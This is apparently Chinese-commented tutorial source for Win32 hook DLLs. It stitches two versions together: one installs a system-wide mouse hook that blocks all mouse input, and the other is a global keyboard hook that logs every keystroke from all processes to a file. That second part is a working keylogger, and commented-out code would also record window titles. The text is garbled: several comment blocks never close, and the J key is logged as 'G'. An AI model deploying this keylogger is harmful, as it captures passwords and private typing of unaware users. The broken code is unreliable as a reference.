/* 
   下面编写的这个动态链接库(DLL)，采用的是WIN32 DLL，而不是MFC DLL，因为WIN32 API能够更详细、更全面
   的控制程序的如何执行，而使用MFC，一些低级的控制是不可能实现的。
   说明：钩子进程是一些依附在一个钩子上的一些函数，因此钩子进程只被WINDOWS调用而不被应用程序调用。
   参数说明：nCode ：钩子代码，钩子进程使用钩子代码去决定是否执行，而钩子代码的值依靠钩子的种类来定的。
   每种钩子种类都有他们自己一系列特性的代码。比如对于WH_KEYBOARD，钩子代码的参数有：HC_ACTION，HC_NOREMOVE.
   HC_ACTION的意义：参数wParam 和lParam 包含了键盘敲打消息的信息，HC_NOREMOVE的意义：参数wParam 和lParam包含了键盘敲打消息的信息，
   并且，键盘敲打消息一直没有从消息队列中删除。也就是说当nCode等于HC_ACTION时，钩子进程必须处理消息。而为HC_NOREMOVE时，
   钩子进程必须传递消息给CallNextHookEx函数，而不能做进一步的处理，而且必须有CallNextHookEx函数的返回值。

   注意：如果钩子进程中nCode小于零，钩子进程必须返回 ：return  CallNextHookEx(nCode，wParam，lParam); 
   而要是钩子进程中的nCode大于零，但是钩子进程并不处理消息，这时推荐你调用CallNextHookEx并且返回该函数的返回值。
   值。否则，如果另一个应用程序也装入WH_KEYBOARD 钩子，那么该钩子将不接受钩子通知并且返回一个不正确的值。如果钩子进程处理了消息，
   它可能返回一个非零值去阻止系统传递该信息到其它剩下的钩子或者windows进程。所以最好在钩子进程的最后都返回CallNextHookEx的返回值。
   CallNexHookEx()函数用于对当前钩子链中的下一个钩子进程传递钩子信息，一个钩子进程既可以在钩子信息处理前，也可以在钩子信息处理后调用
   该函数。该函数的返回值是下一个钩子进程返回的值，当前钩子进程必须返回这个值，返回值的具体含义与挂接的钩子类型有关。
/////////////////////////////////////////

#include <windows.h>
#include <string.h>
#include <stdio.h>

/*
定义全局变量：g_hMouse和g_hKeyboard用来保存安装的鼠标钩子句柄和键盘钩子句柄。
g_hWnd用来保存调用该DLL的进程的主窗口句柄。

这里注意，当这个DLL会被多个进程使用时，这些进程可以共享DLL的代码和数据，这里对于下面我们定义的全局句柄变量：g_hWnd
，应该是被所有进程所共享的，这样的话，在切换到其它进程窗口后，当调用SengMessage给g_hWnd所表示的进程发送一个WM_CLOSE
消息时，调用该DLL的客户程序应该也能退出，但其实没有，这是因为：如果多个进程可以共享同一份可写入的数据的话，这回造成很
严重的后果，为了解决这个问题，Windows 2000采用了写入时复制机制，即：DLL有一个数据可以被两个进程所共享，如果第二个进程想修改
DLL数据页面2上的数据时，操作系统会分配一个新页面，并将数据页面2上的数据复制一份到这个新页面上，同时还会断开数据页面2 到第2
个进程数据空间的映射，将新的页面映射到第二个进程地址空间，而第一个进程中得到的仍然是原始数据。这就是写入时复制机制，但是在改
变数据之前，两个进程仍然是共享同一份数据。并且对于一个只读数据来说，也是在多个进程间共享的。

如果用户希望在HookTest程序运行时，即使切换到其它进程的情况下，按下F2键也能使HookTest程序退出，则可以：为Hook.dll创建一个新的
节，并将此节设置为一个共享的节，然后将全局变量 g_hWnd 放到此节中，让该全局变量在多个进程间共享。
/////////////////////////////////////////////

HINSTANCE hInst;
HHOOK g_hMouse=NULL;
HHOOK g_hKeyboard=NULL;

/*
把 g_hWnd 定义在节里面：其中字符串“ MySec”就是新创建的节的名称，注意这个字符串的最大长度限制为8个，
一个新节的定义的最后必须以#pragma data_seg()结束，表明新节的结尾。还有必须要初始化这个节中放置的变量。
接下来我们要将MySec节设置为共享的节，之后多个进程才能共享这个节中的数据，有两种方法：方法一需要用到指令：
#pragma comment,标志：RWS表明是读，写、共享类型，如本例所示。
将MySec节设置为共享的节，方法二：还可以在DLL的模块定义文件中利用SEGMENTS关键字来实现，具体方法是在该关键字
下写上节的名称，后面指定节的属性，如对于本例可以在Hook.def 文件中已有内容之后添加如下代码：
SEGMENTS
MySec READ WRITE SHARED
// HWND  g_hWnd=NULL; 
////////////////////////////////////////////////  

#pragma data_seg("MySec")
HWND g_hWnd=NULL;
#pragma data_seg()
#pragma  comment(linker, "/section:MySec,RWS")

// 鼠标钩子过程，该过程直接返回一个非0值，表示对鼠标消息已经处理了，也就是该钩子将屏蔽所有的鼠标消息
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
return 1;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
if(VK_F2==wParam)
{
SendMessage(g_hWnd, WM_CLOSE, 0, 0); // 向调用进程的主窗口句柄发送WM_CLOSE消息，让调用进程退出，并移除所安装的钩子
UnhookWindowsHookEx(g_hMouse);
UnhookWindowsHookEx(g_hKeyboard);
}
return 1;
}
/* 定义安装鼠标钩子过程函数：第四个参数为0，这样安装的钩子过程就和运行在同一桌面上的所有进程相关了。
第三个参数要求指定安装钩子过程所在的DLL模块的句柄，有两种方法可以得到：一是为DLL程序提供一个DllMain函数
当第一次加载DLL时，系统会调用这个函数，并且传递当前DLL模块的句柄，因此可以在Hook这一DLL中提供一个动态链接
库入口函数：DllMain，并定义一个全局的实例变量：g_hInst，然后在DLL函数中保存系统传来的DLL模块句柄。
////////////////////////////////////////////////

HINSTANCE g_hInst;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdReason, LPVOID lpvReserved)
{
g_hInst=hinstDLL;
return TRUE;
}

/*另一种获得DLL模块句柄的方法：调用GetModuleHandle函数来得到指定的DLL模块句柄，如果指定的模块已经被映射到当前
进程的地址空间，那么该函数将返回该模块的句柄。GetModuleHandle函数的参数是一个字符串：指定了想要获取其模块句柄
模块名称，该模块可以是一个.exe 文件，也可以是.Dll文件，若不指明扩展名，系统自动会加上.dll为其扩展名，返回值是
HMODULE 类型，但是HMODULE和HINSTANCE类型通用。
///////////////////////////////////////////////////

void SetHook(HWND hwnd)
{
g_hWnd=hwnd;
g_hMouse=SetWindowsHookEx(WH_MOUSE, MouseProc, GetModuleHandle("Hook"),0);
g_hKeyboard=SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle("Hook"), 0);
}

/*
然后为Hook程序定义的一个模块定义文件，方法是选择【File\New...】上的Text File，并命名为：Hook.def,如下：

LIBRARY Hook   : 该语句指定DLL内部名称。
EXPORTS        : 用EXPORTS关键字指定该DLL导出函数的名称：SetHook，
SetHook @2     : @2是从DLL中导出的函数的序号，若想亲自指定序号而不是使用系统安排的序号，可以这样子定义： @ + 序号。
////////////////////////////////////////

/*
在上面这些操作完成之后，就可以编写一个客户端程序加载Dll，然后调用该DLL提供的SetHook函数，从而设置了一个与当前所有进程相关的全局钩子，这样当
一个进程中的某个线程给一个窗口发送消息时，操作系统就会检查这个这个线程是否已经安装了钩子过程，它会发现该线程已经安装了一个全局的钩子过程，
于是就要找到包含这个钩子的DLL，将这个DLL映射到该进程的地址空间中，并调用相应的钩子过程函数，然后将鼠标消息传递给该钩子过程。
*/

#include <windows.h>
#include <stdio.h>
#include <string> 
using std::string;

#define DLL_API  _declspec(dllexport)
#include "Hook.h"

HINSTANCE g_hInst;     // 全局的实例变量
// HWND  g_hWnd=NULL;         // 保存应用程序窗口句柄
FILE * pFile=NULL;

#pragma data_seg("hookdata")  //新创建节来保存所以进程共享变量

HHOOK g_hKeyboard=NULL;
HHOOK g_hMouse=NULL;       // 保存安装的鼠标钩子句柄
HWND g_pretarwnd=NULL;     // 上次鼠标所指的窗口句柄
HWND g_displayrwnd=NULL;  // 显示目标窗口标题编辑框的句柄

#pragma data_seg()

#pragma  comment(linker, "/SECTION:hookdata,RWS")  // 声明为共享

/*一个DLL可以拥有单个进入点函数，系统在不同的时间调用这个进入点函数，如下面的DllMain函数，这个调用可以用来提供
  一些信息，通常用于供DLL进行每个进程或线程的初始化和清除操作，如果你的DLL不需要这些通知信息，就不必在DLL源代码中
  实现这个函数，如果需要，则应实现在这个函数，Windows系统会自动先进入到这个函数开始执行。如果调用的进入点函数不是
  DllMain，而是别的函数，则代码仍能编译链接，但是你的进入点函数永远不会被调用，你的DLL永远不会被初始化。
  DLL使用DllMain函数对DllMain函数的参数进行初始化，所以，当你的DllMain函数执行时，同一个地址空间中的其他DLL可能尚
  为初始化，因此应该避免调用从其他DLL中输入的函数，此外，应该避免从DllMain内部调用LoadLibrary和FreeLibrary函数，因为这
  些函数会形成一个依赖性循环。另外，如果创建全局性的或静态的C++对象，应该注意可能存在同样的问题，因为在你调用DllMain函数的同时
  ，这些对象的析构函数和构造函数也会被调用。*/
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
    switch(dwReason)           // dwReason 用于指明系统为什么调用该函数，共有下面四个值。
    {
	case DLL_PROCESS_ATTACH:  // The DLL is being mapped into the process's address space
	    g_hInst=hinstDLL;     // 参数hinstDLL包含了DLL的实例句柄，用于标记DLL的文件映射被映射到进程的地址空间
	    break;                // 中的虚拟内存地址，将其保存在一个全局变量中，可以在加载资源函数时使用它。

	case DLL_PROCESS_DETACH: // The DLL is being unmapped from the process's address space
	    break;
	case DLL_THREAD_ATTACH:  //进程已创建一个新的线程
	    break;
	case DLL_THREAD_DETACH:  //进程已舍弃了一个线程
	    break;
    }

    return TRUE;
}

// 鼠标钩子过程，该过程直接返回一个非0值，表示对鼠标消息已经处理了，也就是该钩子将屏蔽所有的鼠标消息
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // 	 LPMOUSEHOOKSTRUCT pMouseHooK=(MOUSEHOOKSTRUCT FAR *)lParam;
    // 	 if (nCode>0)
    // 	 {
    // 		 HWND g_targetwnd=pMouseHooK->hwnd; // 取目标窗口句柄
    // 		 HWND ParentWnd=g_targetwnd;
    // 		 while (ParentWnd!=NULL)
    // 		 {
    // 			 g_targetwnd=ParentWnd;
    // 			 ParentWnd=GetParent(g_targetwnd); // 取得应用程序主窗口的句柄
    // 		 }
    // 		 if(g_targetwnd != g_pretarwnd)
    // 		 {
    // 			 char szCaption[100];
    // 			 GetWindowText(g_targetwnd,szCaption,100); // 取得目标窗口标题
    // 			 
    // 			 if (strlen(szCaption))
    // 			 {
    // 				 string strtitle=szCaption; 
    // 				 fprintf(pFile,"%s ",strtitle);	
    // 			 }				 
    // 		
    // 			 g_pretarwnd=g_targetwnd;             // 保存目标窗口
    // 
    // 		 }
    // 
    // 	 }

    return  CallNextHookEx(g_hMouse, nCode, wParam, lParam); // 继续传递消息
}

LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if(lParam & 0x80000000) // 判断键盘是否被按下
    {	

	switch(wParam)
	{
	    // ESC F1~F12
	    case VK_ESCAPE: fprintf(pFile,"%s","ESCAPE ");break;
	    case VK_F1:     fprintf(pFile,"%s","F1 ");break;
	    case VK_F2:     fprintf(pFile,"%s","F2 ");break;
	    case VK_F3:     fprintf(pFile,"%s","F3 ");break;
	    case VK_F4:     fprintf(pFile,"%s","F4 ");break;
	    case VK_F5:     fprintf(pFile,"%s","F5 ");break;
	    case VK_F6:     fprintf(pFile,"%s","F6 ");break;
	    case VK_F7:     fprintf(pFile,"%s","F7 ");break;
	    case VK_F8:     fprintf(pFile,"%s","F8 ");break;
	    case VK_F9:     fprintf(pFile,"%s","F9 ");break;
	    case VK_F10:    fprintf(pFile,"%s","F10 ");break;
	    case VK_F11:    fprintf(pFile,"%s","F11 ");break;
	    case VK_F12:    fprintf(pFile,"%s","F12 ");break;
			    // 0~9
	    case '1':      fprintf(pFile,"%2d",1);break;
	    case '2':      fprintf(pFile,"%2d",2);break;
	    case '3':      fprintf(pFile,"%2d",3);break;
	    case '4':      fprintf(pFile,"%2d",4);break;
	    case '5':      fprintf(pFile,"%2d",5);break;
	    case '6':      fprintf(pFile,"%2d",6);break;
	    case '7':      fprintf(pFile,"%2d",7);break;
	    case '8':      fprintf(pFile,"%2d",8);break;
	    case '9':      fprintf(pFile,"%2d",9);break;
	    case '0':      fprintf(pFile,"%2d",0);break;

	    case VK_NUMPAD1:   fprintf(pFile,"%s","NUMPAD1 ");break;
	    case VK_NUMPAD2:   fprintf(pFile,"%s","NUMPAD2 ");break;
	    case VK_NUMPAD3:   fprintf(pFile,"%s","NUMPAD3 ");break;
	    case VK_NUMPAD4:   fprintf(pFile,"%s","NUMPAD4 ");break;
	    case VK_NUMPAD5:   fprintf(pFile,"%s","NUMPAD5 ");break;
	    case VK_NUMPAD6:   fprintf(pFile,"%s","NUMPAD6");break;
	    case VK_NUMPAD7:   fprintf(pFile,"%s","NUMPAD7 ");break;
	    case VK_NUMPAD8:   fprintf(pFile,"%s","NUMPAD8 ");break;
	    case VK_NUMPAD9:   fprintf(pFile,"%s","NUMPAD9 ");break;
	    case VK_NUMPAD0:   fprintf(pFile,"%s","NUMPAD0 ");break;
			       // A~Z
	    case 'A':  fprintf(pFile,"%s", "A ");break;
	    case 'B':  fprintf(pFile,"%s", "B ");break;
	    case 'C':  fprintf(pFile,"%s", "C ");break;
	    case 'D':  fprintf(pFile,"%s", "D ");break;
	    case 'E':  fprintf(pFile,"%s", "E ");break;
	    case 'F':  fprintf(pFile,"%s", "F ");break;
	    case 'G':  fprintf(pFile,"%s", "G ");break;
	    case 'H':  fprintf(pFile,"%s", "H ");break;
	    case 'I':  fprintf(pFile,"%s", "I ");break;
	    case 'J':  fprintf(pFile,"%s", "G ");break;
	    case 'K':  fprintf(pFile,"%s", "K ");break;
	    case 'L':  fprintf(pFile,"%s", "L ");break;
	    case 'M':  fprintf(pFile,"%s", "M ");break;
	    case 'N':  fprintf(pFile,"%s", "N ");break;
	    case 'O':  fprintf(pFile,"%s", "O ");break;
	    case 'P':  fprintf(pFile,"%s", "P ");break;
	    case 'Q':  fprintf(pFile,"%s", "Q ");break;
	    case 'R':  fprintf(pFile,"%s", "R ");break;
	    case 'S':  fprintf(pFile,"%s", "S ");break;
	    case 'T':  fprintf(pFile,"%s", "T ");break;
	    case 'U':  fprintf(pFile,"%s", "U ");break;
	    case 'V':  fprintf(pFile,"%s", "V ");break;
	    case 'W':  fprintf(pFile,"%s", "W ");break;
	    case 'X':  fprintf(pFile,"%s", "X ");break;
	    case 'Y':  fprintf(pFile,"%s", "Y ");break;
	    case 'Z':  fprintf(pFile,"%s", "Z ");break;
		       // OTHER KEY
	    case VK_UP:    fprintf(pFile,"%s","UP ");break;
	    case VK_DOWN:  fprintf(pFile,"%s","DOWN ");break; //Alt
	    case VK_LEFT:  fprintf(pFile,"%s","LEFT ");break;
	    case VK_RIGHT: fprintf(pFile,"%s","RIGHT ");break;

	    case VK_TAB:   fprintf(pFile,"%s","TAB ");break;
	    case VK_MENU:  fprintf(pFile,"%s","MENU ");break;
	    case VK_SHIFT: fprintf(pFile,"%s","SHIFT ");break;
	    case VK_CONTROL:  fprintf(pFile,"%s","CONTROL ");break;

	    case VK_RETURN:  fprintf(pFile,"%s","RETURN ");break;
	    case VK_ACCEPT:  fprintf(pFile,"%s","ACCEPT ");break;
	    case VK_CLEAR:   fprintf(pFile,"%s","CLEAR ");break;
	    case VK_DELETE:  fprintf(pFile,"%s","DELETE ");break;
	    case VK_CANCEL:  fprintf(pFile,"%s","CANCEL ");break;
	    case VK_CONVERT: fprintf(pFile,"%s","CONVERT ");break;
	    case VK_DIVIDE:  fprintf(pFile,"%s","DIVIDE ");break;
	    case VK_END:     fprintf(pFile,"%s","END ");break;
	    case VK_FINAL:   fprintf(pFile,"%s","FINAL ");break;
	    case VK_HELP:    fprintf(pFile,"%s","HELP ");break;
	    case VK_HOME:    fprintf(pFile,"%s","HOME ");break;
	    case VK_INSERT:  fprintf(pFile,"%s","INSERT ");break;
	    case VK_KANA:    fprintf(pFile,"%s","KANA ");break;
	    case VK_KANJI:   fprintf(pFile,"%s","KANJI ");break;
	    case VK_MODECHANGE:  fprintf(pFile,"%s","MODECHANGE ");break;
	    case VK_MULTIPLY:    fprintf(pFile,"%s","MULTIPLY ");break;
	    case VK_NONCONVERT:  fprintf(pFile,"%s","NONCONVERT ");break;
	    case VK_PAUSE:   fprintf(pFile,"%s","PAUSE ");break;
	    case VK_SPACE:   fprintf(pFile,"%s","SPACE ");break;
	    case VK_LWIN:    fprintf(pFile,"%s","LWIN ");break;
	    case VK_CAPITAL: fprintf(pFile,"%s","CAPITAL ");break;
	    case VK_PRIOR:   fprintf(pFile,"%s","PRIOR ");break;
	    case VK_NEXT:    fprintf(pFile,"%s","NEXT ");break;
	}
	//处理一些特殊按键
	char KeyName[50];
	ZeroMemory(KeyName,50);
	GetKeyNameText(lParam,KeyName,50);
	string KeyNameStr=KeyName;
	if(KeyNameStr=="`")
	    fprintf(pFile,"%s","` ");
	if(KeyNameStr=="-")
	    fprintf(pFile,"%s","- ");
	if(KeyNameStr=="=")
	    fprintf(pFile,"%s","= ");
	if(KeyNameStr=="\\")
	    fprintf(pFile,"%s","\\ ");
	if(KeyNameStr=="Backspace")
	    fprintf(pFile,"%s","Backspace ");
	if(KeyNameStr=="[")
	    fprintf(pFile,"%s","[ ");
	if(KeyNameStr=="]")
	    fprintf(pFile,"%s","] ");
	if(KeyNameStr==";")
	    fprintf(pFile,"%s","; ");
	if(KeyNameStr=="'")
	    fprintf(pFile,"%s","' ");
	if(KeyNameStr==",")
	    fprintf(pFile,"%s",", ");
	if(KeyNameStr==".")
	    fprintf(pFile,"%s",". ");
	if(KeyNameStr=="/")
	    fprintf(pFile,"%s","/ ");
	if(KeyNameStr=="Left Windows")
	    fprintf(pFile,"%s", "Left Windows ");
	if(KeyNameStr=="Right Windows")
	    fprintf(pFile,"%s", "Right Windows ");
	if(KeyNameStr=="Application")
	    fprintf(pFile,"%s", "Application ");
	if(KeyNameStr=="Scroll Lock")
	    fprintf(pFile,"%s", "Scroll Lock ");
	if(KeyNameStr==" Number Lock")
	    fprintf(pFile,"%s", "Number Lock ");
	if(KeyNameStr=="Number -")
	    fprintf(pFile,"%s","Number - ");
	if(KeyNameStr==" Number +")
	    fprintf(pFile,"%s","Number + ");
	if(KeyNameStr==" Number Del")
	    fprintf(pFile,"%s","Number Del ");	



    } 

    return CallNextHookEx(g_hKeyboard, nCode, wParam, lParam); 

}

void SetHook(HWND hwnd,FILE * pfile)
{
    // 	g_hWnd=hwnd;
    pFile=pfile;
    g_displayrwnd=hwnd;	 // 设置显示目标窗口标题编辑框的句柄。
    g_hMouse=SetWindowsHookEx(WH_MOUSE, MouseProc, GetModuleHandle("Hook.dll"),0);
    g_hKeyboard=SetWindowsHookEx(WH_KEYBOARD, KeyBoardProc, GetModuleHandle("Hook.dll"), 0);
}

void UnSetHook()
{
    // SendMessage(g_hWnd, WM_CLOSE, 0, 0); // 向调用进程的主窗口句柄发送WM_CLOSE消息，让调用进程退出，并移除所安装的钩子
    UnhookWindowsHookEx(g_hMouse);
    UnhookWindowsHookEx(g_hKeyboard);	

    g_hInst=NULL;     
    // 	g_hWnd=NULL; 
    g_hKeyboard=NULL;
    g_hMouse=NULL;    
    g_pretarwnd=NULL;     
    g_displayrwnd=NULL; 		

}


